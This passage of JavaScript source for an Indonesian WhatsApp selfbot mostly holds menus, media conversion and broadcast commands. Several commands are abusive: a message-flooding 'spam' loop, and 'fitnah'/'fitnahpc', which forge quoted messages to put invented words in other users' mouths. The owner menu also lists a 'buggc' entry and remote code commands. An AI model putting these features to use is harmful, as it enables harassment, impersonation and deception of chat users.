67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true},sendEphemeral:true});break
            case prefix+'mystat': 
			case prefix+'mystatus':
				let ii = []
				let giid = []
				for (mem of totalchat){
					ii.push(mem.jid)
				}
				for (id of ii){
					if (id && id.includes('g.us')){
						giid.push(id)
					}
				}
                let timestampi = speed();
				let latensii = speed() - timestampi
                const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = alpha.user.phone
                anu = process.uptime()
                teskny = `◯ *MY STATS*
⤷ *V. Whatsapp :* ${wa_version}
⤷ *RAM :* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
⤷ *MCC :* ${mcc}
⤷ *MNC :* ${mnc}
⤷ *Versi OS :* ${os_version}
⤷ *Merk HP :* ${device_manufacturer}
⤷ *Versi HP :* ${device_model}
⤷ *Group Chat :* ${giid.length}
⤷ *Personal Chat :* ${totalchat.length - giid.length}
⤷ *Total Chat :* ${totalchat.length}
⤷ *Speed :* ${latensii.toFixed(4)} Second
⤷ *Runtime :* ${kyun(anu)}`
				alpha.sendMessage(from, teskny, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
        case prefix+'convertmenu':   
        ghea =`*CONVERT MENU*
\`\`\`❒ ${prefix}toimg
❒ ${prefix}tomp3
❒ ${prefix}tomp4
❒ ${prefix}slow
❒ ${prefix}fast
❒ ${prefix}reverse
❒ ${prefix}tourl\`\`\``
alpha.sendMessage(from, ghea, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
case prefix+'downloadmenu':
gheaa =`*DOWNLOAD MENU*
\`\`\`❒ ${prefix}ytsearch <query>
❒ ${prefix}igstalk <username>
❒ ${prefix}play <query>
❒ ${prefix}video <query>
❒ ${prefix}ytmp3 <link>
❒ ${prefix}ytmp4 <link>
❒ ${prefix}ig <link>
❒ ${prefix}twitter <link>
❒ ${prefix}tiktok <link>
❒ ${prefix}tiktokaudio <link>
❒ ${prefix}fb <link>
❒ ${prefix}brainly <query>
❒ ${prefix}image <query>
❒ ${prefix}anime <random>\`\`\``
alpha.sendMessage(from, gheaa, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
case prefix+'funmenu':   
        gheau =`*FUN MENU*
\`\`\`❒ ${prefix}fitnah
❒ ${prefix}fitnahpc
❒ ${prefix}kontak\`\`\``
alpha.sendMessage(from, gheau, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
case prefix+'makermenu':   
        gheauu =`*MAKER MENU*
\`\`\`❒ ${prefix}sticker
❒ ${prefix}swm <author|packname>
❒ ${prefix}take <author|packname>
❒ ${prefix}fdeface
❒ ${prefix}emoji\`\`\``
alpha.sendMessage(from, gheauu, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
case prefix+'othermenu':   
        gheauuu =`*OTHER MENU*
\`\`\`❒ ${prefix}add
❒ ${prefix}ping
❒ ${prefix}get <link>
❒ ${prefix}getpp @user
❒ ${prefix}getbio @user
❒ ${prefix}tagall
❒ ${prefix}admin
❒ ${prefix}hentai
❒ ${prefix}trapnime
❒ ${prefix}blowjob
❒ ${prefix}awoo
❒ ${prefix}megumin
❒ ${prefix}neko\`\`\``
alpha.sendMessage(from, gheauuu, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
case prefix+'ownermenu':   
        gheauuuu =`*OWNER ONLY*
\`\`\`❒ ${prefix}off
❒ ${prefix}on
❒ ${prefix}buggc
❒ ${prefix}bc
❒ ${prefix}bcimage
❒ ${prefix}bcgif
❒ ${prefix}bcvideo
❒ ${prefix}bcsticker
❒ ${prefix}status
❒ ${prefix}clearall
❒ ${prefix}self
❒ ${prefix}public
❒ ${prefix}join
❒ ${prefix}leave
❒ ${prefix}clearall
❒ ${prefix}setthumb
❒ ${prefix}settarget
❒ ${prefix}setfakeimg
❒ ${prefix}setreply
❒ ${prefix}term <code>
❒ x <code>\`\`\``
alpha.sendMessage(from, gheauuuu, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
case prefix+'storagemenu':   
        gheauuuuu =`*STORAGE MENU*
\`\`\`❒ ${prefix}addstik 
❒ ${prefix}addimg 
❒ ${prefix}addvid 
❒ ${prefix}addvn 
❒ ${prefix}getstik 
❒ ${prefix}getimg 
❒ ${prefix}getvid 
❒ ${prefix}getvn 
❒ ${prefix}liststick
❒ ${prefix}listimg
❒ ${prefix}listvid
❒ ${prefix}listvn\`\`\``
alpha.sendMessage(from, gheauuuuu, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
case prefix+'tagmenu':   
        gheauuuuau =`*MENU TAG*
\`\`\`❒ ${prefix}hidetag
❒ ${prefix}kontag
❒ ${prefix}sticktag
❒ ${prefix}totag\`\`\``
alpha.sendMessage(from, gheauuuuau, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
case prefix+'upmenu':   
        gheauuuuau =`*UP STORY*
\`\`\`❒ ${prefix}upswteks
❒ ${prefix}upswimage
❒ ${prefix}upswvideo\`\`\``
alpha.sendMessage(from, gheauuuuau, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
/*++++++++++++++++++++++++++
+++++++++MENU BARU++++++++
+++++++++++++++++++++++++++*/

/*case 'getdeskgc':
			   if (!isGroup) return reply('```ONLY GROUP```')
			   anu = from
			   metadete = await alpha.groupMetadata(anu)
			   alpha.sendMessage(from, metadete.desc, text, {quoted: fgclink})
			   break
case 'getppgc':
				if (!isGroup) return reply('```ONLY GROUP```')
				anu = from
				if (`${anu}@g.us`) {
				try {
					ppimg = await alpha.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				metadete = await alpha.groupMetadata(anu)
				ano = await alpha.getProfilePicture(anu)
				buffer = await getBuffer(ano)
				alpha.sendMessage(from, buffer, image, {quoted: fgclink})
				} else {
				}
			   break*/
case prefix+ 'getbio':
				if (!isGroup) return reply('```ONLY GROUP```')
				if (args.length < 1) return reply('```TAG ORANGNYA```')
                mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                const p = await alpha.getStatus(`${mentioned}`, MessageType.text)
                reply(p.status)
                if (p.status == 401) {
                reply("Error! mungkin diprivate")
                }
                break
/*case 'creategroup':
case 'creategrup':
			    if (!isGroup) return reply('```ONLY GROUP```')
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argza = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					alpha.groupCreate(argza[0], anu)
					reply(`Sukes membuat grup:\n${argza}`)
                }
				break*/
case prefix+'sc':
case prefix+ 'source':
case prefix+ 'sourcecode':
        source =`Source Script Bot : bit.ly/ytzeeoneofc`
alpha.sendMessage(from, source, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
					break
case prefix+'setname':
					if (!isGroup) return reply('```ONLY GROUP```')
					if (!isGroupAdmins) return reply('```ONLY ADMIN GROUP```')
					if (!isBotGroupAdmins) return reply('```Saya Bukan Admin```')
					alpha.groupUpdateSubject(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '「  SUKSES  」Mengubah Nama Grup', text, { quoted: fgclink })
					break 
case prefix+'setdesc':
					if (!isGroup) return reply('```ONLY GROUP```')
					if (!isGroupAdmins) return reply('```ONLY ADMIN GROUP```')
					if (!isBotGroupAdmins) return reply('```Saya Bukan Admin```')
					alpha.groupUpdateDescription(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '*「  SUKSES  」Mengubah Desk Grup', text, { quoted: fgclink })
					break   
case prefix+'spam':
				if (args.length < 1) return reply(`Penggunaan ${prefix}spam teks|jumlahspam`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					alpha.sendMessage(from, argzi[0], MessageType.text)
				}
				break 
case prefix+'readall':
					if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					var chats = await alpha.chats.all()
                    chats.map( async ({ jid }) => {
                          await alpha.chatRead(jid)
                    })
					rdl = `Berhasil membaca ${chats.length} Chat !`
					await alpha.sendMessage(from, rdl, MessageType.text, {quoted: fvideo})
					console.log(chats.length)
					break
case prefix+'listpc':
					  if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					  cpcp = await getpc(totalchat)
					  teks = `*L I S T  P E R S O N A L  C H A T*\nJumlah PC: ${cpcp.length}\n\n`
					  for(let i=0; i<cpcp.length; i++){
						conts = mek.key.fromMe ? mek.user.jid : alpha.contacts[cpcp[i]] || {notify: jid.replace(/@.+/, '')}
						pushnama = alpha.contacts[cpcp[i]] != undefined ? alpha.contacts[cpcp[i]].vname || alpha.contacts[cpcp[i]].notify : undefined
						teks += `• Nama : ${pushnama}\n• Tag : @${cpcp[i].split("@")[0]}\n• Wa.me : wa.me/${cpcp[i].split("@")[0]}\n\n----------------------------------\n\n`
					}
					mentions( teks, cpcp, true)
					break 
case prefix+'listgroup':
				  if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
				  ingfoo = await getGroup(totalchat)
				  teks1 = `*L I S T  G R O U P*\nJumlah Grup: ${ingfoo.length}\n\n`
				   for (let i = 0; i < ingfoo.length; i++){
				   teks1 += `• Nama grup : ${ingfoo[i].subject}\n• ID grup : ${ingfoo[i].id}\n• Dibuat : ${moment(`${ingfoo[i].creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n• Jumlah Peserta : ${ingfoo[i].participants.length}\n\n`
				   }
				   reply(teks1)
				   break 
case prefix+'bcsticker':
case prefix+'bcstik':
					if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {quoted:ftroli})
						}
						fakestatus('Suksess broadcast')
					}
					break
case prefix+'bcvideo':
					if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					if (args.length < 1) return reply('.......')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, video, {quoted: fvideo,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus('Suksess broadcast')
					}
					break
case prefix+'bcgif':
					if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					if (args.length < 1) return reply('.......')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, video, {mimetype: Mimetype.gif,quoted : ftroli,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(7)}`})
						}
						fakestatus('Suksess broadcast')
					}
					break     
/*++++++++++++++++++++++++++
+++++++++MENU BARU++++++++
+++++++++++++++++++++++++++*/


        case prefix+'owner':  
        case prefix+'creator':  
                    members_ids = []
		            for (let mem of groupMembers) {
		            members_ids.push(mem.jid)
		            }
		            vcard2 = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${setting.ownername}\n`
		            + `ORG: SUBSCRIBE ZEEONE OFC;\n`
		            + `TEL;type=CELL;type=VOICE;waid=${setting.ownerNumber}:${setting.ownerNumberr}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${setting.ownername}`, vcard: vcard2}, contact, { quoted: fkontak, contextInfo: {"mentionedJid": members_ids}})
		            alpha.sendMessage(from, 'TUHH NOMER OWNER KU [(>_<)] JANGAN KASARIN YAA',MessageType.text, { quoted: fgclink} )
		            break
                
                case prefix+'sider':
                shape = '✓ '
infom = await alpha.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `┗━ ${shape} Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
			
                
             case 'fakeloc':
               var kntl = body.slice(8)
			   var nama = kntl.split("|")[0];
			   var impostor = kntl.split("|")[1];
			   var bro = fs.readFileSync(`image/${tee}.jpg`)
               alpha.sendMessage(from, { name: `${nama}`,address: `${impostor}`,jpegThumbnail: bro }, MessageType.location)
                 
		    break
		    case prefix+ 'on':
		            if (!mek.key.fromMe) return 
		            offline = false
		            fakeitem(' ```ANDA TELAH ONLINE``` ')
		            break       
		    case prefix+ 'status':
		            fakeitem(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
		            break
		    case prefix+ 'off':
		            if (!mek.key.fromMe) return 
		            offline = true
		            waktu = Date.now()
		            anuu = args.join(' ') ? args.join(' ') : '-'
		            alasan = anuu
		            fakeitem(' ```ANDA TELAH OFFLINE``` ')
		            break   
		    case prefix+ 'get':
		            if(!q) return reply('linknya?')
		            fetch(`${args[0]}`).then(res => res.text())  
		            .then(bu =>{
		            fakestatus(bu)
		            })   
		            break
		    case prefix+ 'kontag':
		            pe = args.join('')
		            entah = pe.split('|')[0]
		            nah = pe.split('|')[1]
		            if (isNaN(entah)) return reply('Invalid phone number');
		            members_ids = []
		            for (let mem of groupMembers) {
		            members_ids.push(mem.jid)
		            }
		            vcard = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${nah}\n`
		            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
		            break
		    case prefix+ 'sticktag':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else {
		            fakegroup(`*Reply sticker yang sudah dikirim*`)
		            }
		            break
		    case prefix+ 'totag':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, image, options)
		            fs.unlinkSync(file)
		        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
		            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		            	mimetype : 'audio/mp4',
		            	ptt : true,
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, audio, options)
		            fs.unlinkSync(file)
		        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
		            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		            	mimetype : 'video/mp4',
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, video, options)
		            fs.unlinkSync(file)
		        } else{
		          fakestatus(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
		        }
		        break
		    case prefix+ 'fitnah':
		            if (args.length < 1) return fakegroup(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
		            var gh = args.join('')
		            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
		            var replace = gh.split("|")[0];
		            var target = gh.split("|")[1];
		            var bot = gh.split("|")[2];
		            alpha.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
		            break
		    case prefix+ 'settarget':
		            if(!q) return fakegroup(`${prefix}settarget 628xxxxx`)
		            targetpc = args[0]
		            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
		            break
		    case prefix+ 'fitnahpc':
		            if(!q) return fakegroup(`${prefix}fitnahpc teks target|teks lu`)
		            jids = `${targetpc}@s.whatsapp.net` // nomer target
		            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
		            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
		            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
		            const responye = await alpha.sendMessage(jids, `${split[1]}`, MessageType.text, options)
		            await alpha.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
		            break
		    case prefix+ 'tomp3':
		            if (!isQuotedVideo) return fakegroup('```Reply videonya!```')
		            fakegroup(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case prefix+ 'fast':
		            if (!isQuotedVideo) return fakegroup('Reply videonya!')
		            fakegroup(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case prefix+ 'slow':
		            if (!isQuotedVideo) return fakegroup('Reply videonya!')
		            fakegroup(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case prefix+ 'reverse':
		            if (!isQuotedVideo) return fakegroup('```Reply videonya!```')
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case prefix+ 'anime':
		            fakegroup('```BENTAR```')
		            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
		            .then(res => res.text())
		            .then(body => {
		            let tod = body.split("\n");
		            let pjr = tod[Math.floor(Math.random() * tod.length)];
		            imageToBase64(pjr)
		            .then((response) => {
		            media =  Buffer.from(response, 'base64');
		            alpha.sendMessage(from,media,image,{quoted:mek,caption:'Dasar wibu. Nih!!!\nJgn lupa sub YT : ZEEONE OFC'})
		            }
		            )
		            .catch((error) => {
		            console.log(error); 
		            }
		            )
		            });
		            break
		    case prefix+ 'kontak':
		            pe = args.join(' ') 
		            entah = pe.split('|')[0]
		            nah = pe.split('|')[1]
		            if (isNaN(entah)) return reply('Invalid phone number');
		            vcard = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${nah}\n`
		            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
		            break    
		    case prefix+ 'take':
		    case prefix+ 'colong':
		    		if (!isQuotedSticker) return reply('Stiker aja om')
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				    media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            anu = args.join(' ').split('|')
		            satu = anu[0] !== '' ? anu[0] : `YT GUA`
		            dua = typeof anu[1] !== 'undefined' ? anu[1] : `ZEEONE OFC`
		            require('./lib/fetcher.js').createExif(satu, dua)
					require('./lib/fetcher.js').modStick(media, alpha, mek, from)
					break
			case prefix+ 'stikerwm':
			case prefix+ 'stickerwm':
		    case prefix+ 'swm':
		            pe = args.join('')
		            var a = pe.split("|")[0];
		            var b = pe.split("|")[1];
		            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
		            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		             media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media)
		            .on('error', (e) => {
		            console.log(e)
